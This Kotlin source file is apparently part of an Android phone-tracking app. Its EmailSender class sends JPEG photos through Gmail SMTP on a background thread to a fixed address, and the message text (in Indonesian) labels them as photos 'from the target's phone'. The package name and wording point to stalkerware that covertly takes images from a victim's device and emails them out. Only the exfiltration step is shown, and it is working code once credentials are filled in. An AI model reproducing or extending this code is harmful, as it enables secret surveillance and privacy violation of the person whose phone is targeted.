package com.endourev.trackingphone

import java.util.*
import javax.mail.*
import javax.mail.internet.*
import javax.activation.*
import javax.mail.util.ByteArrayDataSource

class EmailSender {

    fun sendEmailWithImage(imageBytes: ByteArray) {
        val username = "emailkamu@gmail.com"
        val password = "APP_PASSWORD"

        val props = Properties().apply {
            put("mail.smtp.auth", "true")
            put("mail.smtp.starttls.enable", "true")
            put("mail.smtp.host", "smtp.gmail.com")
            put("mail.smtp.port", "587")
        }

        val session = Session.getInstance(props, object : Authenticator() {
            override fun getPasswordAuthentication(): PasswordAuthentication {
                return PasswordAuthentication(username, password)
            }
        })

        Thread {
            try {
                val message = MimeMessage(session)
                message.setFrom(InternetAddress(username))
                message.setRecipients(
                    Message.RecipientType.TO,
                    InternetAddress.parse("emailtujuan@gmail.com")
                )
                message.subject = "Foto dari aplikasi"

                val textPart = MimeBodyPart()
                textPart.setText("Ini foto dari HP target")

                val imagePart = MimeBodyPart()
                val ds = ByteArrayDataSource(imageBytes, "image/jpeg")
                imagePart.dataHandler = DataHandler(ds)
                imagePart.fileName = "photo.jpg"

                val multipart = MimeMultipart()
                multipart.addBodyPart(textPart)
                multipart.addBodyPart(imagePart)

                message.setContent(multipart)

                Transport.send(message)

            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }
}